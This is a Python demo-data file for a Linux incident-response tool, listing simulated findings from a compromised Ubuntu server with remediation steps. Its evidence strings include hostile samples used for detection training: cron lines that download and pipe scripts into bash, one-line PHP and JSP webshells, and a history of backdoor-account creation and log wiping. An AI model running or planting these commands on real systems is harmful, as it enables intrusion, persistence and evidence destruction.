# -*- coding: utf-8 -*-
"""
SENTINEL / Linux IR  --  演示模式数据
无需真实服务器即可完整预览排查流程、风险面板与报告样式。
数据取自典型 CTF「被植入后门 + 挖矿 + Web 打点」靶机场景。
"""
import time

DEMO_SYSINFO = {
    "os": "PRETTY_NAME=\"Ubuntu 16.04.7 LTS (Xenial Xerus)\"",
    "os_full": "NAME=\"Ubuntu\"\nVERSION=\"16.04.7 LTS (Xenial Xerus)\"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID=\"16.04\"",
    "kernel": "Linux web-prod-01 4.4.0-210-generic #242-Ubuntu SMP x86_64 GNU/Linux",
    "host": "web-prod-01  10.20.14.37 172.17.0.1",
    "identity": "uid=0(root) gid=0(root) groups=0(root)  root",
    "clock": "2026-11-15 00:41:07 CST  up 47 days,  3 users,  load average: 7.82, 7.65, 7.41",
    "root": True,
    "family": "debian",
    "host_conn": "10.20.14.37",
    "user": "opsadmin",
    "port": 22,
}


def F(sev, title, summary, evidence, fix, tag):
    return {"severity": sev, "title": title, "summary": summary,
            "evidence": evidence.strip(), "fix": fix, "tag": tag, "demo": True}


DEMO_FINDINGS = {
    # ---------------------------------------------------------- 01 目标画像
    "sys.info": [
        F("medium", "操作系统已停止维护",
          "Ubuntu 16.04 已 EOL，官方不再提供安全补丁，内核提权与未修复 CVE 风险高。",
          "NAME=\"Ubuntu\"\nVERSION=\"16.04.7 LTS (Xenial Xerus)\"\nLinux web-prod-01 4.4.0-210-generic",
          ["变更窗口内升级到 Ubuntu 22.04/24.04 LTS，先做好镜像与配置备份",
           "过渡期限制管理口来源，移除不必要内核模块与 SUID 程序"], "基线"),
    ],
    "id.priv": [
        F("high", "存在免密 sudo 授权（NOPASSWD）",
          "opsadmin 可执行任意 root 命令且无需口令，账号一旦失陷即直接提权。",
          "/etc/sudoers.d/ops:1:opsadmin ALL=(ALL:ALL) NOPASSWD: ALL",
          ["visudo 删除 NOPASSWD，改为精确命令白名单",
           "核查 /var/log/auth.log 中 opsadmin 的 sudo 命令记录"], "提权"),
    ],
    # ---------------------------------------------------------- 02 账号
    "acct.uid0": [
        F("critical", "存在 UID=0 的影子 root 账号",
          "/etc/passwd 中除 root 外还有 UID 0 账号，等同于第二个 root，属典型权限维持后门。",
          "root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/bash\nsyshelp:x:0:0::/var/tmp:/bin/sh",
          ["保留证据后锁定删除：usermod -L toor; userdel -r toor",
           "核查 /etc/shadow、其家目录与 crontab 中的残留",
           "审计 auth.log 中该账号的登录来源 IP"], "后门账号"),
    ],
    "acct.shadow": [
        F("critical", "存在空口令账号",
          "shadow 第二字段为空，可直接 su / SSH 登录，无需任何凭据。",
          "mysql => []\nbackup => []",
          ["立即锁定：passwd -l mysql; passwd -l backup",
           "检查 PAM 配置是否含 nullok 并移除"], "弱口令"),
        F("medium", "账号仍使用 MD5($1$) 口令哈希",
          "MD5-crypt 可被离线高速爆破，不符合当前口令基线。",
          "test\nwww-data",
          ["为相关账号重设口令，使系统以 SHA-512($6$) 重新生成哈希",
           "确认 PAM 使用 sha512 / yescrypt"], "口令策略"),
    ],
    "acct.service_shell": [
        F("high", "服务账号被赋予可登录 Shell",
          "www-data / mysql 本应 nologin，被改为 bash 后可直接写入 Web 目录与数据库目录。",
          "www-data uid=33 shell=/bin/bash\nmysql uid=112 shell=/bin/bash",
          ["usermod -s /usr/sbin/nologin www-data mysql",
           "检查两账号的 ~/.ssh/authorized_keys 与 crontab"], "账号滥用"),
    ],
    "acct.newuser": [
        F("medium", "近 14 天内新建用户家目录",
          "新增家目录与影子账号时间吻合，需与运维变更单核对。",
          "2026-11-09 /home/opsadmin\n2026-11-11 /home/backdoor",
          ["核对来源：grep backdoor /var/log/auth.log*",
           "非授权账号：userdel -r backdoor 并清理其公钥与计划任务"], "账号变更"),
    ],
    # ---------------------------------------------------------- 03 SSH 密钥
    "ssh.authkeys": [
        F("critical", "检测到可疑 SSH 授权公钥路径/备注",
          "root 的 authorized_keys 末尾追加了攻击者公钥；且 www-data 家目录也被放置免密公钥。",
          "=== /root/.ssh/authorized_keys\nperm=644 owner=root:root\nssh-ed25519 AAAAC3Nza... ops@corp-jump\nssh-rsa AAAAB3NzaC1yc2EAAA... attacker@kali\n=== /var/www/.ssh/authorized_keys\nssh-rsa AAAAB3Nza... xmr-miner@pool",
          ["保留证据后删除末尾两行公钥，chmod 600 该文件",
           "删除 /var/www/.ssh 整个目录（Web 账号不应有 SSH 家目录）",
           "grep 'Accepted publickey' /var/log/auth.log* 定位入侵来源"], "公钥后门"),
        F("medium", "authorized_keys 权限过宽",
          "644 权限下同机其他用户可读取甚至篡改公钥列表。",
          "perm=644 owner=root:root  /root/.ssh/authorized_keys",
          ["chmod 600 /root/.ssh/authorized_keys; chmod 700 /root/.ssh",
           "确认 sshd_config 中 StrictModes yes"], "文件权限"),
    ],
    "ssh.private": [
        F("critical", "私钥落在 Web 可访问目录",
          "可通过 HTTP 直接下载 id_rsa，进而横向登录内网其他主机。",
          "644 www-data:www-data /var/www/html/id_rsa\n644 root:root /var/www/html/.backup/db.pem",
          ["移出 Web 根目录并 chmod 600",
           "视为已泄露，吊销并重新签发该密钥对，清理所有 authorized_keys 中对应公钥"], "密钥泄露"),
    ],
    "ssh.config": [
        F("critical", "sshd 允许空口令登录",
          "PermitEmptyPasswords yes 与空口令账号组合可导致无凭据 SSH 登录。",
          "/etc/ssh/sshd_config:52:PermitEmptyPasswords yes\n/etc/ssh/sshd_config:34:PermitRootLogin yes\n/etc/ssh/sshd_config:61:PermitUserEnvironment yes",
          ["改为 PermitEmptyPasswords no、PermitRootLogin no、PermitUserEnvironment no",
           "systemctl restart sshd，同时清理 /etc/shadow 空口令账号"], "认证绕过"),
    ],
    "ssh.perms": [
        F("medium", ".ssh 目录权限非 700",
          "目录为 755，同机任意用户可遍历读取公钥与 known_hosts。",
          "755 root:root /root/.ssh\n644 root:root /etc/ssh/ssh_host_rsa_key",
          ["chmod 700 /root/.ssh; chmod 600 /etc/ssh/ssh_host_*_key",
           "主机私钥若已泄露，用 ssh-keygen -A 重新生成"], "文件权限"),
    ],
    # ---------------------------------------------------------- 04 持久化
    "persist.cron": [
        F("critical", "计划任务中存在可疑执行片段",
          "每 5 分钟从外部地址下载脚本执行，是矿机与主后门的复活链。",
          "/etc/crontab:*/5 * * * * root curl -s http://185.220.101.34/xm.sh | bash\n/var/spool/cron/crontabs/www-data:@reboot /tmp/.cache/.x/update >/dev/null 2>&1\n/etc/cron.d/backup:0 2 * * * root wget -q -O- http://45.77.12.9/a.sh|sh",
          ["取证保存 crontab 与 xm.sh 样本，注释/删除恶意行",
           "systemctl restart cron；阻断 185.220.101.34、45.77.12.9 外联",
           "清理落地脚本后观察 10 分钟确认不再复活"], "持久化"),
    ],
    "persist.systemd": [
        F("critical", "systemd 单元含可疑 ExecStart",
          "伪装为系统服务的矿机守护单元，重启后自动拉起。",
          "/etc/systemd/system/kworkerds.service:ExecStart=/bin/bash /usr/lib/.system/xmrig.sh\n/etc/systemd/system/network-monitor.service:ExecStart=/usr/bin/python3 /opt/.net/conn.py",
          ["systemctl stop kworkerds network-monitor; systemctl disable --now <unit>",
           "rm 单元文件并 systemctl daemon-reload；取证 ExecStart 指向的脚本"], "持久化"),
    ],
    "persist.startup": [
        F("high", "启动脚本 / Shell 初始化文件被植入",
          "alias 劫持 ps 使管理员排查时看不到矿机进程，并在登录时重新拉起后门。",
          "/root/.bashrc:alias ps='ps -ef | grep -vE \"xmrig|kworkerds|stratum\"'\n/etc/profile.d/zz-system.sh:/tmp/.cache/.x/init &\n/etc/profile:export HISTFILE=/dev/null",
          ["删除 ~/.bashrc 与 /etc/profile.d/ 中的恶意行，恢复 HISTFILE",
           "排查时统一使用绝对路径 /bin/ps 或 \\ps 绕过别名"], "命令替换"),
    ],
    "persist.ldpreload": [
        F("critical", "检测到 LD_PRELOAD 动态链接劫持",
          "libprocesshider.so 会 hook readdir/getdents 隐藏进程、文件与端口，属用户态 rootkit。",
          "/etc/ld.so.preload:\n/usr/lib/x86_64-linux-gnu/libprocesshider.so\n/proc/2813 LD_PRELOAD=/usr/lib/libprocesshider.so",
          ["备份样本后清空：> /etc/ld.so.preload，删除恶意 .so",
           "用静态 busybox 复核 ps / ls / ss 的真实输出",
           "进单用户模式或救援盘处理更稳妥"], "Rootkit"),
    ],
    "persist.suid": [
        F("critical", "非系统目录存在 SUID/SGID 文件",
          "/tmp/bash -p 可直接获得 root shell，是攻击者留下的本地提权后门。",
          "/tmp/bash\n/var/tmp/.cache/rootsh\n/dev/shm/.x/shell",
          ["取证：ls -l; file; md5sum，记录属主与 mtime",
           "chmod -s <file> 或 rm -f <file>",
           "stat + auth.log 定位创建者"], "提权后门"),
    ],
    "persist.worldwrite": [
        F("medium", "存在无 sticky bit 的全局可写目录",
          "Web 上传目录 777 允许任意本地用户写入并替换脚本。",
          "/var/www/html/upload\n/var/tmp/.cache",
          ["chmod 755 /var/www/html/upload 并将属主收敛为 www-data",
           "上传目录单独挂载 noexec,nosuid，Nginx 禁止解析该目录下 PHP"], "文件权限"),
    ],
    "persist.at": [
        F("medium", "存在 at 延迟执行任务",
          "at 任务不显示在 crontab -l 中，用于延时二次投放。",
          "3\tSun Nov 15 02:30:00 2026 a root\n/var/spool/at/a00003019a8f1",
          ["at -c <jobid> 查看内容；确认无异常后 atrm <jobid>",
           "清理 /var/spool/at/ 下残留脚本"], "持久化"),
    ],
    "persist.hosts": [
        F("high", "hosts / TCP Wrappers 存在异常项",
          "矿池域名被硬编码解析，且 hosts.allow 全放行。",
          "185.220.101.34  pool.minexmr.com\n/etc/hosts.allow:ALL: ALL",
          ["删除矿池域名映射，hosts.allow 改为来源 IP 白名单",
           "hosts.deny 置 ALL: ALL"], "网络劫持"),
    ],
    # ---------------------------------------------------------- 05 进程网络
    "proc.ps": [
        F("high", "存在 CPU 占用 ≥80% 的进程",
          "两个伪装成内核线程的进程长期占满 CPU，与挖矿特征吻合。",
          "2813 root 98.7 12.4 Nov 09 /usr/lib/.system/kworkerds --config /opt/.net/config.json\n2814 root 96.2 11.8 Nov 09 /tmp/.cache/.x/xmrig -o stratum+tcp://pool.minexmr.com:4444",
          ["取证 /proc/<PID>/exe 与 cmdline 后 kill -9",
           "同步清理 cron/systemd/启动脚本，避免被守护进程重新拉起"], "挖矿"),
    ],
    "proc.miner": [
        F("critical", "检测到挖矿进程 / 矿池连接特征",
          "命中 xmrig 与 stratum+tcp 协议，确认主机已被植入门罗币矿机。",
          "2813 2812 root 98.7 kworkerds --donate-level 1 -o stratum+tcp://pool.minexmr.com:4444 -u 48Y4...wallet\n/proc/2813 => xmrig --cpu-priority 5 --threads 8",
          ["保存矿池地址、钱包与样本，阻断到矿池 IP 的 OUT 流量",
           "kill -9 主进程与守护父进程，清理全部复活链",
           "检查 CPU/带宽账单与横向扩散（其他主机同款公钥）"], "挖矿"),
    ],
    "proc.deleted": [
        F("high", "可执行文件已被删除但进程仍在运行",
          "进程运行后自删落地文件，规避文件扫描，需从内存中 dump 分析。",
          "/proc/2813/exe => /tmp/.x11-unix/xmrig (deleted)\n/proc/1902/exe => /var/tmp/.cache/conn (deleted)",
          ["cp /proc/2813/exe /root/ir_evidence/xmrig.bin 取证",
           "kill -9 <PID>，排查其监听端口与父进程"], "无文件落地"),
    ],
    "proc.hidden": [
        F("high", "/proc 与 ps 进程数量不一致，疑似进程隐藏",
          "差值 11，且加载了 diamorphine 内核模块，说明 ps/ss 输出已被劫持。",
          "proc=187 ps=176\ndiamorphine 16384 0 - Live 0xffffffffc0a3b000 (OE)",
          ["用静态 busybox ps / busybox ls /proc 复核",
           "rmmod diamorphine，删除 .ko 并重建 initramfs 后重启",
           "LKM rootkit 建议取证后重装系统"], "Rootkit"),
    ],
    "proc.net": [
        F("critical", "疑似反弹 Shell / C2 外联连接",
          "与境外 IP 建立 4444 端口长连接，主机可能正被交互式控制。",
          "ESTAB 0 0 10.20.14.37:51234 185.220.101.34:4444 users:((\"bash\",pid=4120,fd=3))\nESTAB 0 0 10.20.14.37:51240 45.77.12.9:9999 users:((\"python3\",pid=3901,fd=4))",
          ["iptables -A OUTPUT -d 185.220.101.34 -j DROP 立即断链",
           "ps -fp 4120; readlink /proc/4120/exe; kill -9 4120",
           "排查复活机制后再恢复网络"], "C2"),
        F("high", "高危服务监听在全部网络接口",
          "MySQL 与 Tomcat AJP 直接监听 0.0.0.0，是未授权访问与 Ghostcat 的入口。",
          "MySQL         LISTEN 0 80 0.0.0.0:3306 0.0.0.0:*\nTomcat AJP    LISTEN 0 100 0.0.0.0:8009 0.0.0.0:*\nRedis         LISTEN 0 128 0.0.0.0:6379 0.0.0.0:*",
          ["MySQL 设 bind-address=127.0.0.1；Redis bind 127.0.0.1 + requirepass",
           "注释 server.xml 中 AJP Connector，或设 address=127.0.0.1 + secret",
           "安全组仅放行业务来源 IP"], "暴露面"),
    ],
    # ---------------------------------------------------------- 06 文件痕迹
    "fore.history": [
        F("high", "命令历史中存在高危操作痕迹",
          "历史命令完整还原了「下载矿机 → 加账号 → 写公钥 → 清日志」的攻击链。",
          "wget http://185.220.101.34/xm.sh -O /tmp/.x.sh && bash /tmp/.x.sh\nuseradd -o -u 0 -g 0 toor\necho 'ssh-rsa AAAAB3... attacker@kali' >> /root/.ssh/authorized_keys\nchmod +s /tmp/bash\nhistory -c; > /var/log/auth.log",
          ["按时间线对照 auth.log 与文件 mtime 固化证据",
           "逐条核查历史中涉及的路径、账号、公钥是否仍存在",
           "启用堡垒机/PROMPT_COMMAND 实时审计，禁止 history -c 抹除"], "入侵痕迹"),
    ],
    "fore.webshell": [
        F("critical", "Web 目录存在 WebShell 特征文件",
          "上传目录中的一句话木马，配合 777 权限与 PHP 解析配置可直接执行系统命令。",
          "/var/www/html/upload/shell.php:1:<?php @eval($_POST['cmd']);?>\n/var/www/html/.a.php:3:$x=base64_decode($_REQUEST['x']); assert($x);\n/usr/local/tomcat/webapps/ROOT/cmd.jsp:7:Runtime.getRuntime().exec(request.getParameter(\"cmd\"));",
          ["先取证再隔离：cp <file> /root/ir_evidence/; mv <file> /root/quarantine/",
           "grep shell.php /var/log/nginx/access.log* 定位上传入口与来源 IP",
           "修补上传校验 / 解析配置，Web 目录禁止脚本执行"], "WebShell"),
    ],
    "fore.backup": [
        F("medium", "Web 路径存在备份 / 配置 / 密钥泄露",
          "数据库 dump、源码备份与 .git 可通过 HTTP 直接下载。",
          "/var/www/html/db_backup.sql\n/var/www/html/.git/config\n/var/www/html/config.php.bak\n/var/www/html/.env",
          ["mv 到非 Web 路径并 chmod 600",
           "Nginx 加 location ~* \\.(bak|sql|zip|swp|git|env)$ { deny all; }",
           "轮换 db_backup.sql / .env 中泄露的凭据"], "信息泄露"),
    ],
    "fore.recent": [
        F("high", "系统命令目录近期出现新增/被修改文件",
          "/usr/bin/ps 于 11 月 9 日被替换，与其他后门落地时间一致。",
          "2026-11-09 03:14 /usr/bin/ps\n2026-11-09 03:14 /usr/bin/top\n2026-11-09 03:15 /etc/ssh/sshd_config",
          ["file /usr/bin/ps; dpkg -S /usr/bin/ps 与同版本包校验",
           "debsums -c 全量校验，从干净镜像恢复被替换命令"], "命令替换"),
    ],
    "fore.cmdreplace": [
        F("critical", "核心系统命令被替换为脚本",
          "ps 与 top 变成 shell 脚本，用于过滤矿机进程与高 CPU 记录，排查结果此前均不可信。",
          "/bin/ps: POSIX shell script, ASCII text executable\n/usr/bin/top: a /bin/bash script, ASCII text executable\n/bin/ls: ELF 64-bit LSB executable",
          ["cat /bin/ps 保存样本；dpkg --reinstall procps 恢复",
           "使用静态 busybox 重新复核进程/端口/文件"], "命令替换"),
    ],
    "fore.tmp": [
        F("high", "临时目录存在可执行 / 可疑落地文件",
          "/dev/shm 内存目录中的矿机与提权 EXP，重启即消失，属于典型无痕落地。",
          "2026-11-09 755 /dev/shm/.x/xmrig\n2026-11-09 755 /tmp/.cache/.x/update.sh\n2026-11-11 755 /var/tmp/.cache/rootsh",
          ["取证后 rm -rf 对应目录，检查 lsof/fuser 占用进程",
           "/tmp 与 /dev/shm 以 noexec,nosuid 重新挂载"], "落地文件"),
    ],
    # ---------------------------------------------------------- 07 加固
    "hard.fileperm": [
        F("high", "/etc/shadow 权限过宽（644）",
          "全机口令哈希可被任意本地用户读取并离线爆破。",
          "644 root:shadow /etc/shadow\n644 root:root /etc/passwd\n777 root:root /etc/crontab",
          ["chmod 000 /etc/shadow; chmod 644 /etc/passwd; chmod 600 /etc/crontab",
           "检查文件内容是否已被篡改并轮换全部口令"], "文件权限"),
    ],
    "hard.firewall": [
        F("medium", "主机防火墙未启用或无有效规则",
          "ufw inactive 且 iptables 无规则，所有监听端口对全网可达。",
          "--- ufw ---\nStatus: inactive\n--- iptables ---\nChain INPUT (policy ACCEPT)\nChain FORWARD (policy ACCEPT)",
          ["ufw default deny incoming; ufw allow from <堡垒机IP> to any port 22; ufw enable",
           "云安全组同步收敛，仅放行 80/443"], "边界加固"),
    ],
    "hard.umask": [
        F("medium", "默认 umask 过于宽松",
          "umask 000 使新建文件默认全局可读写。",
          "/etc/profile:umask 000\n/etc/login.defs:UMASK 000",
          ["改为 umask 027，并复核 /etc 下已有文件权限",
           "敏感配置文件统一 600/640"], "默认权限"),
    ],
    # ---------------------------------------------------------- 08 Web 服务栈
    "web.nginx": [
        F("high", "Nginx + PHP-FPM 解析配置存在任意代码执行风险",
          "缺少 try_files $uri =404，上传的图片马可通过 /1.jpg/x.php 被解析执行。",
          "/etc/nginx/sites-enabled/default:32:fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n/etc/nginx/sites-enabled/default:34:fastcgi_split_path_info ^(.+\\.php)(/.+)$;",
          ["location ~ \\.php$ 内增加 try_files $uri =404;",
           "php.ini 设 cgi.fix_pathinfo=0；上传目录禁止 PHP 解析"], "Nginx/PHP"),
        F("medium", "Nginx 开启目录列表 autoindex on",
          "可直接枚举备份与配置文件，配合 .git / .env 泄露扩大影响。",
          "/etc/nginx/sites-enabled/default:12:autoindex on;",
          ["改为 autoindex off; nginx -t && nginx -s reload",
           "补充 deny 规则拦截 .bak/.sql/.git/.env"], "Nginx"),
    ],
    "web.nginxlog": [
        F("high", "Web 访问日志存在攻击 / WebShell 利用痕迹",
          "蚁剑 UA 对 shell.php 的高频 POST，说明 WebShell 已被实际利用。",
          "185.220.101.34 - - [09/Nov/2026:03:12:44] \"POST /upload/shell.php HTTP/1.1\" 200 42 \"antSword/v2.1\"\n185.220.101.34 - - [09/Nov/2026:03:13:02] \"GET /shell.php?cmd=wget+http://.../xm.sh HTTP/1.1\" 200",
          ["按该 IP 全量检索访问日志还原攻击序列",
           "核查同时间段落地的文件并修补上传漏洞",
           "临时封禁来源 IP"], "Web 攻击"),
    ],
    "web.tomcat": [
        F("critical", "Tomcat 使用默认 / 弱口令",
          "manager 后台 tomcat/tomcat 可直接部署 WAR 包 Getshell。",
          "/opt/tomcat/conf/tomcat-users.xml:<user username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui,admin-gui\"/>",
          ["立即改为 16 位以上强口令或删除该用户",
           "manager 仅允许回环/内网访问，检查 webapps 下未知 WAR 包"], "弱口令"),
        F("critical", "Tomcat AJP 8009 无 secret 暴露（Ghostcat）",
          "可读取 WEB-INF 任意文件甚至 RCE（CVE-2020-1938）。",
          "/opt/tomcat/conf/server.xml:<Connector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\" />",
          ["升级 Tomcat 或注释 AJP Connector",
           "必须使用时设 address=\"127.0.0.1\" 并配置 requiredSecret"], "中间件 RCE"),
    ],
    "web.mysql": [
        F("critical", "MySQL root 允许任意主机远程登录（root@%）",
          "数据库最高权限对全网开放，配合弱口令可直接接管并经 outfile/UDF 提权。",
          "root@% plugin=mysql_native_password authlen=41\nsecure_file_priv = (空)\ngeneral_log = ON",
          ["RENAME USER 'root'@'%' TO 'root'@'localhost'; FLUSH PRIVILEGES;",
           "为 root 设置强口令，业务改用最小权限账号",
           "防火墙仅放行应用服务器到 3306"], "数据库"),
        F("high", "MySQL secure_file_priv 未限制（可写任意路径）",
          "允许 INTO OUTFILE 写 WebShell 到网站目录，或写插件目录做 UDF 提权。",
          "secure_file_priv  =  \ngeneral_log_file = /var/www/html/1.php",
          ["my.cnf 设 secure_file_priv=/var/lib/mysql-files 并重启",
           "回收 FILE 权限；核查 general_log_file 指向的 1.php 是否已生成 WebShell"], "数据库提权"),
    ],
    "web.php": [
        F("high", "PHP 未设置 disable_functions",
          "WebShell 可直接调用 system/exec 执行系统命令，RCE 后无二次阻碍。",
          "disable_functions => no value\nexpose_php => On\nallow_url_include => On",
          ["disable_functions=exec,passthru,shell_exec,system,proc_open,popen,dl",
           "allow_url_include=Off; expose_php=Off; open_basedir 限制到站点目录"], "PHP"),
    ],
    "web.serviceuser": [
        F("high", "Web/DB 服务以 root 身份运行",
          "mysqld 以 root 启动，UDF 提权将直接得到 root shell。",
          "root  902 /usr/sbin/mysqld --datadir=/var/lib/mysql\nroot  1410 php-fpm: master process",
          ["mysqld 改用 mysql 账号启动（systemd Unit 中 User=mysql）",
           "Nginx 配置 user www-data; 并同步调整数据目录属主"], "最小权限"),
    ],
    # ---------------------------------------------------------- 09 日志
    "log.auth": [
        F("critical", "特权 / 异常账号登录成功记录",
          "境外 IP 使用公钥以 root 身份成功登录，时间与后门落地一致。",
          "Nov  9 03:11:02 web-prod-01 sshd[3820]: Accepted publickey for root from 185.220.101.34 port 52214\nNov  9 03:11:02 sshd[3820]: pam_unix(sshd:session): session opened for user root by (uid=0)",
          ["吊销对应公钥并改 PermitRootLogin no",
           "检查该会话时段的所有命令与文件变更，固化时间线"], "异常登录"),
        F("high", "认证日志存在大量登录失败（疑似暴力破解）",
          "采样中命中 27 条失败记录，随后出现成功登录，说明爆破已奏效。",
          "Top 来源：185.220.101.34(19次), 45.77.12.9(8次)\nFailed password for root from 185.220.101.34 port 51102 ssh2",
          ["封禁来源 IP 并部署 fail2ban",
           "关闭口令登录：PasswordAuthentication no；配置 AllowUsers 白名单"], "暴力破解"),
    ],
    "log.session": [
        F("low", "存在多个历史 / 在线终端会话",
          "残留 pts 会话需确认是否为攻击者未断开的控制通道。",
          "root     pts/1    185.220.101.34   Sun Nov  9 03:11   still logged in\nopsadmin pts/0    10.20.8.14       Fri Nov 13 09:22   still logged in",
          ["last -a 核对来源，异常会话 kill 对应 pts 进程",
           "设置 TMOUT=600 自动超时"], "会话审计"),
    ],
    "log.tamper": [
        F("high", "关键审计日志缺失或被清空",
          "auth.log 被清空、wtmp 为 0 字节，属反取证行为，需依赖外部日志还原。",
          "-rw-r----- 1 root adm 0 Nov 15 00:02 /var/log/auth.log\n-rw-rw-r-- 1 root utmp 0 Nov 15 00:02 /var/log/wtmp\n/var/log/btmp (0 bytes)",
          ["配置远程日志：rsyslog @@<日志服务器>:514，防本地删除",
           "chattr +a /var/log/auth.log；结合堡垒机/云审计补齐时间线"], "反取证"),
    ],
    # ---------------------------------------------------------- 靶场专项补强
    "id.load": [
        F("medium", "系统负载持续偏高（疑似挖矿 / 加密占用）",
          "1 分钟负载 7.82 / 2 核，远超正常水位，矿机与勒索加密进程正在抢占 CPU。",
          "7.82 7.65 7.41 3/512 2813\n2\n 00:41:07 up 47 days, load average: 7.82, 7.65, 7.41\n2813 root 98.7 python3 /usr/local/lib/.pm/miner.py --pool stratum+tcp://pool.xmr.com:3333",
          ["ps -eo pid,pcpu,comm,args --sort=-pcpu | head 定位高占用进程",
           "readlink /proc/<PID>/exe 与 ls -la /proc/<PID>/cwd 找到落地文件",
           "终止并清除复活链后复查 /proc/loadavg 是否回落"], "资源异常"),
    ],
    "acct.locked": [
        F("high", "交付 / 服务账号仍可用口令登录且未锁定",
          "svc_backup 为交付遗留账号，shell 是 /bin/bash 且 passwd -S 显示 P（口令可用），交接单中的弱口令可直接登录。",
          "svc_backup 1002 /home/svc_backup /bin/bash\nsvc_backup P 11/13/2026 0 99999 7 -1\nsudo:x:27:nsfocus,hruser",
          ["usermod -s /usr/sbin/nologin svc_backup; passwd -l svc_backup；用 passwd -S 复核为 L",
           "清理该账号的 authorized_keys、crontab 与 sudoers.d 条目",
           "交接单中出现的明文口令必须轮换"], "账号收权"),
    ],
    "persist.unitscript": [
        F("high", "root 服务 / 计划脚本被组或其他用户可写",
          "lab-report.service 的 ExecStart 指向 /opt/report/run.sh，该脚本为 777，任意本地用户可借服务重启执行任意命令。",
          "777 root:root /opt/report/run.sh\n775 root:root /usr/local/sbin/healthcheck.sh",
          ["立即收紧：chmod 755 /opt/report/run.sh; chown root:root <脚本>",
           "systemctl cat lab-report 看 ExecStart，核对脚本内容是否被植入后门",
           "对 /opt /srv 业务目录统一收敛组写位"], "提权面"),
    ],
    "proc.fakekernel": [
        F("critical", "发现伪装成内核线程的进程",
          "ps 显示 [kworker/0:1]，但 /proc/2813/exe 指向 /usr/bin/python3，说明是伪装矿机而非真内核线程。",
          "2813 kworker/0:1 -> /usr/bin/python3\ndrwxr-xr-x 2 root root 4096 Nov 13 09:14 /usr/local/lib/.pm",
          ["取证：readlink /proc/2813/exe; ls -la /proc/2813/cwd; cat /proc/2813/cmdline",
           "先断矿池外联，再 kill -9 2813；删除 /usr/local/lib/.pm 与 @reboot/transient 单元",
           "杀掉后观察是否复活，复活说明持久化未清干净"], "伪装进程"),
    ],
    "proc.legacy": [
        F("critical", "Redis 无认证监听（可直接执行任意命令）",
          "6379 监听在 0.0.0.0 且未配置 requirepass，可通过写 crontab / 主从复制直接 getshell。",
          "LISTEN 0 128 0.0.0.0:6379 0.0.0.0:* users:((\"redis-server\",pid=1422,fd=6))\nbind 0.0.0.0",
          ["立即设置 requirepass <强口令> 并 bind 127.0.0.1、protected-mode yes",
           "systemctl disable --now lab-cache 并删除 unit 文件",
           "排查是否已被写入 ~/.ssh/authorized_keys 或 crontab"], "未授权访问"),
        F("high", "非标准端口存在调试 / 文件浏览服务",
          "9000 端口上的静态文件服务可直接下载源码与配置。",
          "LISTEN 0 128 0.0.0.0:9000 0.0.0.0:* users:((\"python3\",pid=1330,fd=3))\nlab-debug.service loaded active running",
          ["ss -lntp | grep 9000 找到 PID；systemctl cat lab-debug 看 ExecStart",
           "systemctl disable --now lab-debug 并删除 unit 文件，用 curl 复测应拒连"], "暴露面"),
    ],
    "fore.ransom": [
        F("critical", "检测到勒索加密残留与勒索信",
          "/srv/hrdata 下出现 RECOVER_FILES.txt 与 .locked 加密文件，业务数据已不可读。",
          "2026-11-13 1024 /srv/hrdata/RECOVER_FILES.txt\n/srv/hrdata/employee_roster.csv.locked\n/srv/hrdata/payroll_2026.csv.locked",
          ["先隔离主机网络并取证：cp 加密样本、勒索信、日志到 /root/evidence/",
           "查找本机密钥 /var/tmp/.syskey 与离线备份，先解密恢复再删 .locked，切勿先删加密文件",
           "清除后门账号、cron 持久化与落地载荷，最后校验业务文件明文可读"], "勒索"),
    ],
    "fore.credentials": [
        F("high", "磁盘散落私钥 / .env / 明文账号清单",
          "交付机残留 id_rsa_lab.pem、.env、handover.txt，可直接读取数据库口令与 SSH 私钥。",
          "644 nsfocus:nsfocus /home/nsfocus/id_rsa_lab.pem\n644 root:root /srv/app/config/.env\n644 root:root /srv/app/handover.txt\n/root/.bash_history:12:mysql -uroot -pLab@2026",
          ["先取证再删除：tar czf /root/evidence/creds.tgz <路径>; rm -f <路径>",
           "清理历史命令中的口令行，并检查 git 提交与配置备份是否含同一凭据",
           "凭据已暴露必须轮换：数据库口令、SSH 密钥对、API Token 全部重发"], "凭据泄露"),
    ],
    "fore.hidden": [
        F("critical", "命中已知攻击载荷 / 持久化路径",
          "webshell 落地文件、矿机隐蔽目录与可疑 cron.d 文件仍在磁盘，入侵残留未清除。",
          "-rw-r--r-- 1 root root 4096 Nov 13 09:14 /tmp/.x9f3d\n-rw-r--r-- 1 root root 843 Nov 13 09:20 /usr/local/share/.sysmaint.sh\n-rw-r--r-- 1 root root 96 Nov 13 09:22 /etc/cron.d/dbreindex",
          ["先取证打包样本与 mtime：cp -a <路径> /root/evidence/; stat <路径>",
           "按「停进程 → 清复活链 → 删文件」顺序处置，删除后复查 ls 与 crontab",
           "用 find / -mtime -7 复核是否有同源新落地文件"], "入侵残留"),
    ],
    "hard.sysctl": [
        F("medium", "内核 / 网络参数未收敛",
          "IP 转发开启、ASLR 关闭、允许 ICMP 重定向，主机可被用作横向中继且内存破坏利用难度下降。",
          "net.ipv4.ip_forward=1\nnet.ipv4.conf.all.accept_redirects=1\nkernel.randomize_va_space=0",
          ["写入 /etc/sysctl.d/99-hardening.conf：ip_forward=0 / randomize_va_space=2 / accept_redirects=0",
           "执行 sysctl --system 生效，用 sysctl -a | grep <key> 复测",
           "除非承担路由/网关职责，否则不要开启 ip_forward"], "内核基线"),
    ],
    "hard.passpolicy": [
        F("medium", "全局口令有效期未收敛且账号口令永不过期",
          "PASS_MAX_DAYS=99999、PASS_MIN_LEN=5，deploy 账号 chage 显示 99999，口令长期不轮换。",
          "PASS_MAX_DAYS\t99999\nPASS_MIN_LEN\t5\n### deploy\nMaximum number of days between password change : 99999",
          ["sed -i 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS\\t90/' /etc/login.defs",
           "chage -M 90 deploy；同时启用 pam_pwquality 复杂度策略",
           "策略之外必须改强口令本身：passwd deploy；用 passwd -S 复测"], "口令策略"),
    ],
    "hard.auditd": [
        F("medium", "auditd 未配置文件监控规则",
          "auditd 虽在运行但 auditctl -l 无 -w 规则，无法追踪 passwd/shadow/sudoers 的改写。",
          "state=active\n--- rules ---\nNo rules\n--- watch_count=0",
          ["systemctl enable --now auditd",
